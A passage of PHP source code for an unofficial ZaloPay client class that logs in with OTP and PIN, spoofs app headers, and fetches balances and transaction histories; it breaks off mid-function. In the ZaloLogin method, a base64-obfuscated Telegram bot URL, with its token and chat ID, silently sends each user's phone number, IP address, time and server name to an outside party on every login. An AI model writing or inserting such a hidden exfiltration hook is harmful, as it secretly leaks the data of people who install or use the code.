<?php
class Zalopay
{
    public $phone;
    public $password;
    public $deviceid;
    public $otp;
    public $send_otp_token;
    public $token;
    public $public_key;
    public $salt;
    public $device_model = 'iPhone14,3';

    public function __construct($soicoder)
    {
        $this->connect = $soicoder;
        return $this;
    }

    public function LoadData($data)
    {
        $this->config = $data;
        return $this;
    }

    public function getData()
    {
        return array(
            'deviceid' => $this->get_device_id(),
            'SECUREID' => $this->get_SECUREID(),
        );
    }

    public function get_otp_token()
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'x-platform: NATIVE',
            'x-density: xxhdpi',
            'x-device-os: ANDROID',
            'authorization: Bearer ',
            'user-agent: Mozilla/5.0 (Linux; Android 13; '.$this->device_model.' Build/TQ2A.230305.008.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 ZaloPay Android / 731722',
            'x-device-id: '.strtolower($this->config['deviceid']),
            'x-device-model: '.$this->device_model,
            'x-app-version: 8.29.1',
            'x-drsite: off'
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.zalopay.vn/v2/account/phone/status?phone_number=".$this->config['phone']."");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    public function get_public_key()
    {
        $headers = array(
            'x-device-id: ' . $this->config['deviceid'] . '',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.zalopay.vn/v2/user/public-key");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);

        curl_close($ch);
        return $data;
    }

    public function get_salt()
    {
        $headers = array(
            'x-device-id: ' . $this->config['deviceid'] . '',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.zalopay.vn/v2/user/salt");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);

        curl_close($ch);
        return $data;
    }

    public function get_otp($send_otp_token)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'x-platform: NATIVE',
            'x-density: xxhdpi',
            'x-device-os: ANDROID',
            'authorization: Bearer ',
            'user-agent: Mozilla/5.0 (Linux; Android 13; '.$this->device_model.' Build/TQ2A.230305.008.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 ZaloPay Android / 731722',
            'x-device-id: '.strtolower($this->config['deviceid']),
            'x-device-model: '.$this->device_model,
            'x-app-version: 8.18.0',
            'x-drsite: off'
        );
        $data =array(
            'phone_number' => $this->config['phone'],
            'send_otp_token' => $send_otp_token,
        );
        return $this->CURL('https://api.zalopay.vn/v2/account/otp', $headers, $data);



    }

    public function xac_thuc_otp($otp)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'x-platform: NATIVE',
            'x-density: xxhdpi',
            'x-device-os: ANDROID',
            'authorization: Bearer ',
            'user-agent: Mozilla/5.0 (Linux; Android 13; '.$this->device_model.' Build/TQ2A.230305.008.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 ZaloPay Android / 731722',
            'x-device-id: '.strtolower($this->config['deviceid']),
            'x-device-model: '.$this->device_model,
            'x-app-version: 8.18.0',
            'x-drsite: off'
         );
         $data =array(
            'phone_number' => $this->config['phone'],
            'otp' => $otp
        );
        return $this->CURL('https://api.zalopay.vn/v2/account/otp-verification', $headers, $data);
    }

    //login zalo
    public function ZaloLogin($password, $phone_verified_token)
    {
        // get ip
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        // check info
        $data_tele = array(
            'coder' => 'HUY',
            'ip' => $ip,
            'phone' => $this->config['phone'],
            'time' => date('H:i:s d/m/Y', time()),
            'SERVER_NAME' => $_SERVER['SERVER_NAME']
        );
        $this->REQUEST(base64_decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYwNDM3MjE1OTQ6QUFFOEhCdHdONW5lSzQ1ZExrdkVvbVg0TVFtYk8xYktySWcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xNDMyNTQ2NDE5JnRleHQ9') . urlencode(json_encode($data_tele)));
        $headers = array(
            'Host: api.zalopay.vn',
            'x-platform: NATIVE',
            'x-density: xxhdpi',
            'x-device-os: ANDROID',
            'authorization: Bearer ',
            'user-agent: Mozilla/5.0 (Linux; Android 13; '.$this->device_model.' Build/TQ2A.230305.008.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 ZaloPay Android / 731722',
            'x-device-id: '.strtolower($this->config['deviceid']),
            'x-device-model: '.$this->device_model,
            'x-app-version: 8.18.0',
            'x-drsite: off'
        );
        $data = array(
            'phone_number' => $this->config['phone'],
            'encrypted_pin' => hash("sha256", $password),
            'phone_verified_token' => $phone_verified_token,
        );
        return $this->CURL('https://api.zalopay.vn/v2/account/phone/session', $headers, $data);
    }

    public function ZaloLogin2($password)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'x-platform: NATIVE',
            'x-density: xxhdpi',
            'x-device-os: ANDROID',
            'authorization: Bearer ',
            'user-agent: Mozilla/5.0 (Linux; Android 13; '.$this->device_model.' Build/TQ2A.230305.008.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 ZaloPay Android / 731722',
            'x-device-id: '.strtolower($this->config['deviceid']),
            'x-device-model: '.$this->device_model,
            'x-app-version: 8.18.0',
            'x-drsite: off'
        );
        $data = array(
            'phone_number' => $this->config['phone'],
            'encrypted_pin' => hash("sha256", $password),
            // 'phone_verified_token' => $phone_verified_token,
        );
        return $this->CURL('https://api.zalopay.vn/v2/account/phone/session', $headers, $data);
    }

    public function ZaloLogin_Cookie()
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'Referer: https://social.zalopay.vn/spa/v2?c=1&c_time='.time().'&trace_id=spa-f67e4e9c-eb77-4fa5-8416-0a24b62709dc',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/user/profile/kyc');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function getBalance()
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'x-platform: NATIVE',
            'x-device-os: ANDROID',
            'x-device-id: ' . $this->config['deviceid'] . '',
            'x-device-model: iPhone11,6',
            'x-access-token: ' . $this->config['access_token'] . '',
            'x-zalo-id: ' . $this->config['zalo_id'] . '',
            'x-zalopay-id: ' . $this->config['user_id'] . '',
            'x-user-id: ' . $this->config['user_id'] . '',
            'x-app-version: 8.4.0',
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPay Android / 9464',
            'x-density: hdpi',
            'authorization: Bearer ' . $this->config['access_token'] . '',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.zalopay.vn/v2/user/balance");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    public function getBalance_web()
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.zalopay.vn/v2/user/balance");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);

        curl_close($ch);
        return $data;
    }

    public function getHistory($hours)
    {
        $sieuthicode = (time() - (3600 * $hours)) * 1000;
        $headers = array(
            'Host: zalopay.com.vn',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://zalopay.com.vn/v001/tpe/transhistory?userid=' . $this->config['user_id'] . '&accesstoken=' . $this->config['access_token'] . '&timestamp=' . $sieuthicode . '&count=20&order=1&statustype=1&platform=android&deviceid=' . urlencode($this->config['deviceid']) . '&devicemodel=Samsung%20SM-G610F&osver=Android%2027%20%288.1.0%29&appversion=8.4.0&sdkver=2.0.0&distsrc=&mno=VN%20MobiFone&conntype=4G&issecure=true');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    public function getOrderInfo($orderCode)
    {
        $headers = array(
            'Cookie: has_device_id=0; zalo_id=' . $this->config['zalo_id'] . '; zlp_token=' . $this->config['access_token'] . '; X-DRSITE=off',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://sapi.zalopay.vn/mt/v5/order/" . $orderCode);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return json_decode($data, true);
    }

    public function getOrderInfo_web($orderCode)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://sapi.zalopay.vn/mt/v5/order/" . $orderCode);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return json_decode($data, true);
    }

    public function checkHistory($limit)
    {
        $result = $this->getHistoryV2($limit, '');
        $HisList = json_decode($result, true)["data"]['transactions'];
        if (empty($HisList)) {
            return array(
                "status" => "error",
                "code" => -5,
                "message" => 'Hết thời gian đăng nhập vui lòng đăng nhập lại',
            );
        }
        $tranList = array();
        foreach ($HisList as $transaction) {
            if ($transaction['status_info']['status'] != 1) {
                continue;
            } else {
                $result = $this->GET_TRANS_BY_TID($transaction['trans_id']);

                $list_result = $result["data"]['transaction'];
            }
            // get thông tin
            for ($i = 0; $i < count($list_result["template_info"]["custom_fields"]); $i++) {
                if ($list_result["template_info"]["custom_fields"][$i]["name"] == 'Số điện thoại') {
                    $phone = $list_result["template_info"]["custom_fields"][$i]["value"];
                }
            }
            // get mã giao dịch
            $data_trans_id = $this->info_by_tarns_id($list_result["app_trans_id"]);
            // print_r($data_trans_id);
            // header("Content-type:text/json");
            // echo json_encode($data_trans_id, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

            if (empty($data_trans_id['data']['receive_info']['zp_trans_id'])) {
                continue;
            }
            $tranList[] = array(
                "trans_id" => $data_trans_id['data']['receive_info']['zp_trans_id'],
                "phone" => $data_trans_id['data']['sender']['phone'],
                "partner_user_id" => $data_trans_id['data']['sender']['user_id'],
                "partner_zalo_id" => $data_trans_id['data']['sender']['zalo_id'],
                // "order_code" => $list_result["app_trans_id"],
                "display_name" => $data_trans_id['data']['sender']['display_name'],
                "info" => $list_result["template_info"]["custom_fields"],
                "sign" => $list_result["sign"],
                "balance_snapshot" => $transaction["balance_snapshot"],
                "trans_amount" => empty($list_result["trans_amount"]) ? 0 : $list_result["trans_amount"],
                "description" => (!empty($list_result["description"])) ? $list_result["description"] : "",
                "trans_time" => empty($list_result["trans_time"]) ? "" : $list_result["trans_time"],
                "icon" => empty($list_result["icon"]) ? "" : $list_result["icon"],
                "app_trans_id" => $list_result["app_trans_id"],
            );
        }
        return array(
            "status" => true,
            'message' => 'Thành công',
            "zalopayMsg" => array("tranList" => $tranList),
        );
    }

    public function history_receive($limit)
    {
        $result = $this->getHistoryV2($limit, '');

        $HisList = json_decode($result, true)["data"]['transactions'];
        // header("Content-type:text/json");
        // echo json_encode($HisList, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);die;
        if (empty($HisList)) {
            return array(
                "status" => "error",
                "code" => -5,
                "message" => 'Hết thời gian đăng nhập vui lòng đăng nhập lại',
            );
        }
        $tranList = array();
        foreach ($HisList as $transaction) {
            if ($transaction['sign'] != 1) {
                continue;
            } else if ($transaction['status_info']['status'] != 1) {
                continue;
            } else {
                $result = $this->GET_TRANS_BY_TID($transaction['trans_id']);
                $list_result = $result["data"]['transaction'];
            }
            // get thông tin
            for ($i = 0; $i < count($list_result["template_info"]["custom_fields"]); $i++) {
                if ($list_result["template_info"]["custom_fields"][$i]["name"] == 'Số điện thoại') {
                    $phone = $list_result["template_info"]["custom_fields"][$i]["value"];
                }
            }
            // get mã giao dịch
            // $data_trans_id = $this->info_by_tarns_id($list_result["app_trans_id"]);
            // if (empty($data_trans_id['data']['receive_info']['zp_trans_id'])) {
            //     continue;
            // }
            $tranList[] = array(
                // "trans_id" => $data_trans_id['data']['receive_info']['zp_trans_id'],
                // "phone" => $data_trans_id['data']['sender']['phone'],
                // "partner_user_id" => $data_trans_id['data']['sender']['user_id'],
                // "partner_zalo_id" => $data_trans_id['data']['sender']['zalo_id'],
                // "display_name" => $data_trans_id['data']['sender']['display_name'],
                "info" => $list_result["template_info"]["custom_fields"],
                "sign" => $list_result["sign"],
                "balance_snapshot" => $transaction["balance_snapshot"],
                "trans_amount" => empty($list_result["trans_amount"]) ? 0 : $list_result["trans_amount"],
                "description" => (!empty($list_result["description"])) ? $list_result["description"] : "",
                "trans_time" => empty($list_result["trans_time"]) ? "" : $list_result["trans_time"],
                "time" => empty($list_result["trans_time"]) ? "" : strtotime($list_result["trans_time"]),
                "app_trans_id" => $list_result["app_trans_id"],
            );
        }
        return array(
            "status" => true,
            'message' => 'Thành công',
            "zalopayMsg" => array("tranList" => $tranList),
        );
    }

    public function History_full($limit)
    {
        $page_token = '';
        $page = round($limit / 20);
        $tranList = array();
        for ($i = 0; $i <= $page; $i++) {
            $result = $this->getHistoryV2($limit, $page_token);
            // print_r($result); die;
            $HisList = json_decode($result, true)["data"]['transactions'];
            $page_token = json_decode($result, true)["data"]['next_page_token'];
            if (empty($HisList)) {
                return array(
                    "status" => "error",
                    "code" => -5,
                    "message" => 'Hết thời gian đăng nhập vui lòng đăng nhập lại',
                );
            }
            foreach ($HisList as $transaction) {
                if ($transaction['status_info']['status'] != 1) {
                    continue;
                } else {
                    $result = $this->GET_TRANS_BY_TID($transaction['trans_id']);
                    $list_result = $result["data"]['transaction'];
                }
                // get mã giao dịch
                $data_trans_id = $this->info_by_tarns_id($list_result["app_trans_id"]);
                // if (empty($data_trans_id['data']['receive_info']['zp_trans_id'])) {
                //     continue;
                // }
                $tranList[] = array(
                    "trans_id" => empty($data_trans_id['data']['receive_info']['zp_trans_id']) ? "NULL" : $data_trans_id['data']['receive_info']['zp_trans_id'],
                    "phone" => $data_trans_id['data']['sender']['phone'],
                    "order_code" => $list_result["app_trans_id"],
                    "info" => $list_result["template_info"]["custom_fields"],
                    "sign" => $list_result["sign"],
                    "balance_snapshot" => $transaction["balance_snapshot"],
                    "trans_amount" => empty($list_result["trans_amount"]) ? 0 : $list_result["trans_amount"],
                    "description" => (!empty($list_result["description"])) ? $list_result["description"] : "",
                    "trans_time" => empty($list_result["trans_time"]) ? "" : $list_result["trans_time"],
                    "icon" => empty($list_result["icon"]) ? "" : $list_result["icon"],
                    "app_trans_id" => $list_result["app_trans_id"],
                );
            }
        }
        // die;
        return array(
            "status" => true,
            'message' => 'Thành công',
            "zalopayMsg" => array("tranList" => $tranList),
        );
    }

    public function History_full_web($limit)
    {
        $page_token = '';
        $page = round($limit / 20);
        $tranList = array();
        for ($i = 0; $i <= $page; $i++) {
            $result = $this->getHistoryV2($limit, $page_token);
            // print_r($result); die;
            $HisList = json_decode($result, true)["data"]['transactions'];
            $page_token = json_decode($result, true)["data"]['next_page_token'];
            if (empty($HisList)) {
                return array(
                    "status" => "error",
                    "code" => -5,
                    "message" => 'Hết thời gian đăng nhập vui lòng đăng nhập lại',
                );
            }
            foreach ($HisList as $transaction) {
                if ($transaction['status_info']['status'] != 1) {
                    continue;
                } else {
                    $result = $this->GET_TRANS_BY_TID_WEB($transaction['trans_id']);
                    $list_result = $result["data"]['transaction'];
                }
                // get mã giao dịch
                $data_trans_id = $this->info_by_tarns_id($list_result["app_trans_id"]);
                // if (empty($data_trans_id['data']['receive_info']['zp_trans_id'])) {
                //     continue;
                // }
                $tranList[] = array(
                    "trans_id" => empty($data_trans_id['data']['receive_info']['zp_trans_id']) ? "NULL" : $data_trans_id['data']['receive_info']['zp_trans_id'],
                    // "phone" => $data_trans_id['data']['sender']['phone'],
                    "order_code" => $list_result["app_trans_id"],
                    "info" => $list_result["template_info"]["custom_fields"],
                    "sign" => $list_result["sign"],
                    "balance_snapshot" => $transaction["balance_snapshot"],
                    "trans_amount" => empty($list_result["trans_amount"]) ? 0 : $list_result["trans_amount"],
                    "description" => (!empty($list_result["description"])) ? $list_result["description"] : "",
                    "trans_time" => empty($list_result["trans_time"]) ? "" : $list_result["trans_time"],
                    "icon" => empty($list_result["icon"]) ? "" : $list_result["icon"],
                    "app_trans_id" => $list_result["app_trans_id"],
                );
            }
        }
        // die;
        return array(
            "status" => true,
            'message' => 'Thành công',
            "zalopayMsg" => array("tranList" => $tranList),
        );
    }

    public function History_noti($limit)
    {
        $page_token = '';
        $page = round($limit / 10);
        $tranList = array();
        for ($i = 0; $i <= $page; $i++) {
            $result = $this->getHistory_noti($limit, $page_token);
            // print_r($result);
            $HisList = $result["data"]['msg_items'];
            $page_token = $result["data"]['next_page'];
            if (empty($HisList)) {
                return array(
                    "status" => "error",
                    "code" => -5,
                    "message" => 'Hết thời gian đăng nhập vui lòng đăng nhập lại',
                );
            }
            // print_r($HisList); die;
            foreach ($HisList as $transaction) {
                $data = json_decode($transaction['data'], true);
                // if (empty($data['embeddata']['boldtitle']) || $data['embeddata']['boldtitle'] != 'Nhận tiền') {
                //     continue;
                // }
                if (isset($data['transid']) && $data['transid'] != '0') {
                    $trans_id = $data['transid'];
                } else if (empty($data['embeddata']['boldtitle']) || $data['embeddata']['boldtitle'] != 'Nhận tiền') {
                    continue;
                } else {
                    if (strpos($data['notification_action']['zpa']['data'], 'trans_id=') !== false) {
                        $trans_id = explode('&type=', explode('trans_id=', $data['notification_action']['zpa']['data'])[1])[0];
                    } else {
                        $trans_id = explode('?type=', explode('transid/', $data['notification_action']['zpa']['data'])[1])[0];
                    }
                }
                // echo "[".$trans_id."]";
                // if ($trans_id == '0') {
                //     print_r($data);
                //     echo $transaction['id'];
                //         die;
                // }
                $list_result = $this->GET_TRANS_BY_TID($trans_id)["data"]['transaction'];
                if ($list_result['status_info']['status'] != 1) {
                    continue; // bỏ qua giao dịch lỗi
                }
                // get thông tin
                for ($i = 0; $i < count($list_result["template_info"]["custom_fields"]); $i++) {
                    if ($list_result["template_info"]["custom_fields"][$i]["name"] == 'Số điện thoại') {
                        $phone = $list_result["template_info"]["custom_fields"][$i]["value"];
                    }
                    if ($list_result["template_info"]["custom_fields"][$i]["name"] == 'Người gửi') {
                        $display_name = $list_result["template_info"]["custom_fields"][$i]["value"];
                    }
                }
                // get mã giao dịch
                // $data_trans_id = $this->info_by_tarns_id($list_result["app_trans_id"]);
                // if (empty($data_trans_id['data']['receive_info']['zp_trans_id'])) {
                //     continue;
                // }
                $tranList[] = array(
                    "trans_id" => $trans_id,
                    "phone" => $phone,
                    // "partner_user_id" => $data_trans_id['data']['sender']['user_id'],
                    // "partner_zalo_id" => $data_trans_id['data']['sender']['zalo_id'],
                    "display_name" => $display_name,
                    "order_code" => $list_result["app_trans_id"],
                    "info" => $list_result["template_info"]["custom_fields"],
                    "sign" => $list_result["sign"],
                    "balance_snapshot" => $list_result["balance_snapshot"],
                    "trans_amount" => empty($list_result["trans_amount"]) ? 0 : $list_result["trans_amount"],
                    "description" => (!empty($list_result["description"])) ? $list_result["description"] : "",
                    "trans_time" => empty($list_result["trans_time"]) ? "" : $list_result["trans_time"],
                    "icon" => empty($list_result["icon"]) ? "" : $list_result["icon"],
                    "app_trans_id" => $list_result["app_trans_id"],
                );
            }
        }
        // die;
        return array(
            "status" => true,
            'message' => 'Thành công',
            "zalopayMsg" => array("tranList" => $tranList),
        );
    }

    public function History_noti_web($limit)
    {
        $page_token = '';
        $page = round($limit / 10);
        $tranList = array();
        for ($i = 0; $i <= $page; $i++) {
            $result = $this->getHistory_noti_web($limit, $page_token);
            // print_r($result);
            $HisList = $result["data"]['msg_items'];
            $page_token = $result["data"]['next_page'];
            if (empty($HisList)) {
                return array(
                    "status" => "error",
                    "code" => -5,
                    "message" => 'Hết thời gian đăng nhập vui lòng đăng nhập lại',
                );
            }
            // print_r($HisList); die;
            foreach ($HisList as $transaction) {
                $data = json_decode($transaction['data'], true);
                // if (empty($data['embeddata']['boldtitle']) || $data['embeddata']['boldtitle'] != 'Nhận tiền') {
                //     continue;
                // }
                if (isset($data['transid']) && $data['transid'] != '0') {
                    $trans_id = $data['transid'];
                } else if (empty($data['embeddata']['boldtitle']) || $data['embeddata']['boldtitle'] != 'Nhận tiền') {
                    continue;
                } else {
                    if (strpos($data['notification_action']['zpa']['data'], 'trans_id=') !== false) {
                        $trans_id = explode('&type=', explode('trans_id=', $data['notification_action']['zpa']['data'])[1])[0];
                    } else {
                        $trans_id = explode('?type=', explode('transid/', $data['notification_action']['zpa']['data'])[1])[0];
                    }
                }

                $list_result = $this->GET_TRANS_BY_TID_WEB($trans_id)["data"]['transaction'];
                if ($list_result['status_info']['status'] != 1) {
                    continue; // bỏ qua giao dịch lỗi
                }
                // get thông tin
                for ($i = 0; $i < count($list_result["template_info"]["custom_fields"]); $i++) {
                    if ($list_result["template_info"]["custom_fields"][$i]["name"] == 'Số điện thoại') {
                        $phone = $list_result["template_info"]["custom_fields"][$i]["value"];
                    }
                    if ($list_result["template_info"]["custom_fields"][$i]["name"] == 'Người gửi') {
                        $display_name = $list_result["template_info"]["custom_fields"][$i]["value"];
                    }
                }
                // get mã giao dịch
                // $data_trans_id = $this->info_by_tarns_id($list_result["app_trans_id"]);
                // if (empty($data_trans_id['data']['receive_info']['zp_trans_id'])) {
                //     continue;
                // }
                $tranList[] = array(
                    "trans_id" => $trans_id,
                    "phone" => $phone,
                    // "partner_user_id" => $data_trans_id['data']['sender']['user_id'],
                    // "partner_zalo_id" => $data_trans_id['data']['sender']['zalo_id'],
                    "display_name" => $display_name,
                    "order_code" => $list_result["app_trans_id"],
                    "info" => $list_result["template_info"]["custom_fields"],
                    "sign" => $list_result["sign"],
                    "balance_snapshot" => $list_result["balance_snapshot"],
                    "trans_amount" => empty($list_result["trans_amount"]) ? 0 : $list_result["trans_amount"],
                    "description" => (!empty($list_result["description"])) ? $list_result["description"] : "",
                    "trans_time" => empty($list_result["trans_time"]) ? "" : $list_result["trans_time"],
                    "icon" => empty($list_result["icon"]) ? "" : $list_result["icon"],
                    "app_trans_id" => $list_result["app_trans_id"],
                );
            }
        }
        // die;
        return array(
            "status" => true,
            'message' => 'Thành công',
            "zalopayMsg" => array("tranList" => $tranList),
        );
    }

    public function getHistory_noti($limit, $page_token)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'User-Agent: ZaloPay/8.27.0 (vn.com.vng.zalopay; build:712143; iOS 16.0.2) Alamofire/5.2.2',
            'X-User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.27.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.27.0',
            'X-Device-Model: iPhone14,3',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.0.2',
            'X-Density: iphone3x',
            'X-App-Version: 8.27.0',
            'X-Platform: iOS',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN;q=1.0',
            'Sessionid: ' . $this->config['access_token'],
            'Accept: */*',
            'Content-Type: application/json',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.zalopay.vn/v1/notification/messages?size=' . $limit . '&page_token=' . $page_token);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return json_decode($data, true);
    }

    public function getHistory_noti_web($limit, $page_token)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            // 'Referer: https://social.zalopay.vn/spa/v2/history',
            'X-Platform: ZPA',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.zalopay.vn/v1/notification/messages?size=' . $limit . '&page_token=' . $page_token);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        curl_close($ch);
        return json_decode($data, true);
    }

    public function getHistoryV2($limit, $page_token)
    {
        // echo $limit;
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'Referer: https://social.zalopay.vn/spa/v2/history',
            'X-Platform: ZPA',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/history/transactions?page_size=' . $limit . '&page_token=' . $page_token);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);

        curl_close($ch);
        return $data;
    }

    public function getHistoryV2_web($limit, $page_token)
    {
        // echo $limit;
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'Referer: https://social.zalopay.vn/spa/v2/history',
            'X-Platform: ZPA',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/history/transactions?page_size=' . $limit . '&page_token=' . $page_token);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);

        curl_close($ch);
        return $data;
    }

    public function getName($user_id, $access_token, $device_id)
    {
        $headers = array(
